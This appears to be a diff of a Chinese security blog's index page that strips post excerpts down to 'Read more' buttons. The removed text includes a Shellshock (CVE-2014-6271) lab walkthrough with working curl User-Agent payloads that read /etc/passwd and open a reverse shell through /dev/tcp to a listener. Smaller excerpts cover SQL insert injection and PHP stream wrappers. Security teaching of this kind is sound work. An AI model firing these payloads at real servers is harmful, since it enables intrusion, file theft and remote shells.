@@ -283,36 +283,14 @@
 
 <p>从以上阐述的漏洞原理可知，漏洞的根本原因存在于Bash的<code>ENV</code>命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果要达到远程代码执行的目的，必须借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。例如，<code>apache2</code>便可以，其<code>CGI</code>组件满足远程访问并调用Bash的ENV命令进行访问数据解析功能。漏洞实现远程代码执行原理图如下：<br><img src="/images/db3f40e9f1e1a523c0dc165a926dab85bff11b09.png" alt="14139550048538.png"></p>
 <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><code>VulApps/b/bash/shellshock1_CVE-2014-6271</code></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地验证"><a href="#本地验证" class="headerlink" title="本地验证"></a>本地验证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:~/study/VulApps/b/bash/shellshock1_CVE-2014-6271$ docker run -t -i medicean/vulapps:b_bash_shellshock1 /bin/bash</span><br><span class="line">bash-4.3<span class="comment"># env x='() &#123; :;&#125;; echo Vulnerable' bash -c "echo test"                                                                                                  </span></span><br><span class="line">Vulnerable</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">bash-4.3<span class="comment"># uname -a</span></span><br><span class="line">Linux 65ce71c540ba 4.13.0-37-generic <span class="comment">#42~16.04.1-Ubuntu SMP Wed Mar 7 16:03:28 UTC 2018 x86_64 GNU/Linux</span></span><br><span class="line">bash-4.3<span class="comment"># cat /etc/issue       </span></span><br><span class="line">Debian GNU/Linux 8 \n \l</span><br><span class="line"></span><br><span class="line">bash-4.3<span class="comment"># /bin/bash --version</span></span><br><span class="line">GNU bash, version 4.3.24(1)-release (x86_64-unknown-linux-gnu)</span><br><span class="line">Copyright (C) 2013 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">bash-4.3<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>执行命令后，如果显示<code>Vulnerable</code>，证明系统存在漏洞，可改变<code>echo Vulnerable</code>为任意命令进行执行。</p>
-<h3 id="远程验证"><a href="#远程验证" class="headerlink" title="远程验证"></a>远程验证</h3><p>利用<code>VulApps</code>提供的Docker，看下目录结构：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cd /usr/local/apache2/cgi-bin/</span></span><br><span class="line">bash-4.3<span class="comment"># ls</span></span><br><span class="line">poc.cgi  printenv  <span class="built_in">test</span>-cgi</span><br></pre></td></tr></table></figure>
-
-<p><code>poc.cgi</code>的内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat poc.cgi </span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/html"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;html&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;title&gt;Bash ShellShock&lt;/title&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/head&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;pre&gt;'</span></span><br><span class="line">/usr/bin/env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/pre&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/body&gt;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'&lt;/html&gt;'</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
-
-<p><code>printenv</code>的内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat printenv </span></span><br><span class="line"><span class="comment">#!/usr/local/bin/perl</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">##  printenv -- demo CGI program which just prints its environment</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"Content-type: text/plain; charset=iso-8859-1\n\n"</span>;</span><br><span class="line">foreach <span class="variable">$var</span> (sort(keys(%ENV))) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$ENV</span>&#123;<span class="variable">$var</span>&#125;;</span><br><span class="line">    <span class="variable">$val</span> =~ s|\n|\\n|g;</span><br><span class="line">    <span class="variable">$val</span> =~ s|<span class="string">"|\\"</span>|g;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"<span class="variable">$&#123;var&#125;</span>=\"<span class="variable">$&#123;val&#125;</span>\"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>test-cgi</code>的内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat test-cgi </span></span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># disable filename globbing</span></span><br><span class="line"><span class="built_in">set</span> -f</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Content-type: text/plain; charset=iso-8859-1"</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> CGI/1.0 <span class="built_in">test</span> script report:</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> argc is <span class="variable">$#</span>. argv is <span class="string">"$*"</span>.</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> SERVER_SOFTWARE = <span class="variable">$SERVER_SOFTWARE</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_NAME = <span class="variable">$SERVER_NAME</span></span><br><span class="line"><span class="built_in">echo</span> GATEWAY_INTERFACE = <span class="variable">$GATEWAY_INTERFACE</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_PROTOCOL = <span class="variable">$SERVER_PROTOCOL</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_PORT = <span class="variable">$SERVER_PORT</span></span><br><span class="line"><span class="built_in">echo</span> REQUEST_METHOD = <span class="variable">$REQUEST_METHOD</span></span><br><span class="line"><span class="built_in">echo</span> HTTP_ACCEPT = <span class="string">"<span class="variable">$HTTP_ACCEPT</span>"</span></span><br><span class="line"><span class="built_in">echo</span> PATH_INFO = <span class="string">"<span class="variable">$PATH_INFO</span>"</span></span><br><span class="line"><span class="built_in">echo</span> PATH_TRANSLATED = <span class="string">"<span class="variable">$PATH_TRANSLATED</span>"</span></span><br><span class="line"><span class="built_in">echo</span> SCRIPT_NAME = <span class="string">"<span class="variable">$SCRIPT_NAME</span>"</span></span><br><span class="line"><span class="built_in">echo</span> QUERY_STRING = <span class="string">"<span class="variable">$QUERY_STRING</span>"</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_HOST = <span class="variable">$REMOTE_HOST</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_ADDR = <span class="variable">$REMOTE_ADDR</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_USER = <span class="variable">$REMOTE_USER</span></span><br><span class="line"><span class="built_in">echo</span> AUTH_TYPE = <span class="variable">$AUTH_TYPE</span></span><br><span class="line"><span class="built_in">echo</span> CONTENT_TYPE = <span class="variable">$CONTENT_TYPE</span></span><br><span class="line"><span class="built_in">echo</span> CONTENT_LENGTH = <span class="variable">$CONTENT_LENGTH</span></span><br></pre></td></tr></table></figure>
-
-<p>运行docker：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:~/study/VulApps/b/bash/shellshock1_CVE-2014-6271$ docker run -it -d -p 80:80 medicean/vulapps:b_bash_shellshock1 </span><br><span class="line">5f50262d8cbf791142822e857f32f4f8e33920ba2f6484c08e1e4f65749ca41f</span><br></pre></td></tr></table></figure>
-
-<p>访问本地地址：<br><img src="/images/1ebd60facde9478230d4b2e76342ac38e0f932c9.png" alt="Screenshot from 2018-03-29 12-16-38.png"></p>
-<p>测试命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">'() &#123; :; &#125;; a=`/bin/cat /etc/passwd`;echo $a'</span> <span class="string">"http://127.0.0.1/cgi-bin/poc.cgi"</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; a=`/bin/cat /etc/passwd`;<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Thu, 29 Mar 2018 04:18:39 GMT</span><br><span class="line">&lt; Server: Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">&lt; root: x:0:0:root:/root:/bin/bash</span><br><span class="line">&lt; daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">&lt; bin: x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">&lt; sys: x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">&lt; sync: x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">&lt; games: x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">&lt; man: x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">&lt; lp: x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">&lt; mail: x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">&lt; news: x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">&lt; uucp: x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">&lt; proxy: x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">&lt; www-data: x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">&lt; backup: x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">&lt; list: x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">&lt; irc: x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">&lt; gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">&lt; nobody: x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">&lt; systemd-timesync: x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">&lt; systemd-network: x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">&lt; systemd-resolve: x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">&lt; systemd-bus-proxy: x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Bash ShellShock&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">SERVER_SIGNATURE=</span><br><span class="line">UNIQUE_ID=WrxpH6wRAAIAAAAODMgAAAAF</span><br><span class="line">SERVER_PORT=80</span><br><span class="line">HTTP_HOST=127.0.0.1</span><br><span class="line">DOCUMENT_ROOT=/usr/<span class="built_in">local</span>/apache2/htdocs</span><br><span class="line">SCRIPT_FILENAME=/usr/<span class="built_in">local</span>/apache2/cgi-bin/poc.cgi</span><br><span class="line">REQUEST_URI=/cgi-bin/poc.cgi</span><br><span class="line">SCRIPT_NAME=/cgi-bin/poc.cgi</span><br><span class="line">REMOTE_PORT=43562</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/apache2/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">PWD=/usr/<span class="built_in">local</span>/apache2/cgi-bin</span><br><span class="line">SERVER_ADMIN=you@example.com</span><br><span class="line">HTTP_ACCEPT=*/*</span><br><span class="line">REMOTE_ADDR=172.17.0.1</span><br><span class="line">SHLVL=1</span><br><span class="line">SERVER_NAME=127.0.0.1</span><br><span class="line">SERVER_SOFTWARE=Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">QUERY_STRING=</span><br><span class="line">SERVER_ADDR=172.17.0.2</span><br><span class="line">GATEWAY_INTERFACE=CGI/1.1</span><br><span class="line">SERVER_PROTOCOL=HTTP/1.1</span><br><span class="line">REQUEST_METHOD=GET</span><br><span class="line">HTTP_USER_AGENT=() &#123;  :</span><br><span class="line">&#125;</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br></pre></td></tr></table></figure>
-
-<p>命令中可改变<code>a=`/bin/cat/etc/passwd`;echo $a</code>为任意命令进行执行。</p>
-<p>另外一种命令执行方式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">'() &#123; :; &#125;; echo ; echo $(/bin/ls -al /);'</span> <span class="string">"http://127.0.0.1/cgi-bin/poc.cgi"</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; <span class="built_in">echo</span> ; <span class="built_in">echo</span> $(/bin/ls -al /);</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Thu, 29 Mar 2018 04:21:50 GMT</span><br><span class="line">&lt; Server: Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Content-Type: text/plain</span><br><span class="line">&lt; </span><br><span class="line">total 76</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Mar 29 03:57 .dockerenv</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 30  2016 boot</span><br><span class="line">drwxr-xr-x   5 root root  360 Mar 29 03:57 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 30  2016 home</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 lib</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 lib64</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 opt</span><br><span class="line">dr-xr-xr-x 298 root root    0 Mar 29 03:57 proc</span><br><span class="line">drwx------   2 root root 4096 Jul 27  2016 root</span><br><span class="line">drwxr-xr-x   3 root root 4096 Jul 27  2016 run</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Mar 29 04:05 sys</span><br><span class="line">drwxrwxrwt   1 root root 4096 Mar 29 03:57 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 29  2016 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 var</span><br><span class="line">Content-type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Bash ShellShock&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">SERVER_SIGNATURE=</span><br><span class="line">UNIQUE_ID=Wrxp3qwRAAIAAAAHAnkAAAAA</span><br><span class="line">SERVER_PORT=80</span><br><span class="line">HTTP_HOST=127.0.0.1</span><br><span class="line">DOCUMENT_ROOT=/usr/<span class="built_in">local</span>/apache2/htdocs</span><br><span class="line">SCRIPT_FILENAME=/usr/<span class="built_in">local</span>/apache2/cgi-bin/poc.cgi</span><br><span class="line">REQUEST_URI=/cgi-bin/poc.cgi</span><br><span class="line">SCRIPT_NAME=/cgi-bin/poc.cgi</span><br><span class="line">REMOTE_PORT=43590</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/apache2/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">PWD=/usr/<span class="built_in">local</span>/apache2/cgi-bin</span><br><span class="line">SERVER_ADMIN=you@example.com</span><br><span class="line">HTTP_ACCEPT=*/*</span><br><span class="line">REMOTE_ADDR=172.17.0.1</span><br><span class="line">SHLVL=1</span><br><span class="line">SERVER_NAME=127.0.0.1</span><br><span class="line">SERVER_SOFTWARE=Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">QUERY_STRING=</span><br><span class="line">SERVER_ADDR=172.17.0.2</span><br><span class="line">GATEWAY_INTERFACE=CGI/1.1</span><br><span class="line">SERVER_PROTOCOL=HTTP/1.1</span><br><span class="line">REQUEST_METHOD=GET</span><br><span class="line">HTTP_USER_AGENT=() &#123;  :</span><br><span class="line">&#125;</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br></pre></td></tr></table></figure>
-
-<p>反弹Shell的命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">'() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.89/8888 0&gt;&amp;1;'</span> <span class="string">"http://127.0.0.1/cgi-bin/poc.cgi"</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.89/8888 0&gt;&amp;1;</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">m0nst3r@digapis:~$ nc -lvp 8888</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8888)</span><br><span class="line">Connection from [172.17.0.2] port 8888 [tcp/*] accepted (family 2, sport 57046)</span><br><span class="line">bash-4.3$ ls</span><br><span class="line">ls</span><br><span class="line">poc.cgi</span><br><span class="line">printenv</span><br><span class="line"><span class="built_in">test</span>-cgi</span><br><span class="line">bash-4.3$</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/vuls/Bash%20ShellShock%20CVE-2014-6271(%E7%A0%B4%E5%A3%B3).html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -415,6 +393,14 @@
 <p>经过实验可得，如果<code>from</code>后面，<code>union</code>前后的两个<code>select</code>子查询使用相同的值，则会返回一列，故不会出错，从而导致<code>insert into</code>语句成功执行；当两个值不相同时，无论判断成功与否，都会导致<code>insert into</code>语句执行失败，从而转化为时间盲注。</p>
 <p>参考：<br><a href="http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html" target="_blank" rel="noopener">http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html</a><br><a href="https://dev.mysql.com/doc/refman/5.6/en/scalar-subqueries.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.6/en/scalar-subqueries.html</a></p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/sqli/SQL%20Insert%20into%20%E6%B3%A8%E5%85%A5.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -531,128 +517,15 @@
 <h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><code>php://input</code>是可以访问请求的原始数据的只读流。</p>
 <p><code>POST</code>请求的情况下，最好使用<code>php://input</code>来替代<code>$_HTTP_RAW_POST_DATA</code>，因为它不依赖于特定的<code>php.ini</code>指令。</p>
 <p><code>enctype=&quot;multipart/form-data&quot;</code>的时候<code>php://input</code>是无效的。</p>
-<h2 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h2><p><code>php://output</code>是一个只写的数据流，允许你以<code>print</code>和<code>echo</code>一样的方式写入到输出缓冲区。</p>
-<h2 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h2><p><code>php://fd</code>允许直接访问指定的文件描述符，如<code>php://fd/3</code>引用了文件描述符3。</p>
-<h2 id="php-memory和php-temp"><a href="#php-memory和php-temp" class="headerlink" title="php://memory和php://temp"></a>php://memory和php://temp</h2><p><code>php://memory</code>总是把数据存储在内存中</p>
-<p><code>php://temp</code>会在内存量达到预定义的限制之后（默认2M）存入临时文件中。临时文件位置的决定和<code>sys_get_temp_dir()</code>的方式一致。</p>
-<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式的文件函数非常有用，类似<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</p>
-<p><code>php://filter</code>目标使用一下的参数作为它路径的一部分。</p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>resource=&lt;要过滤的数据流&gt;</td>
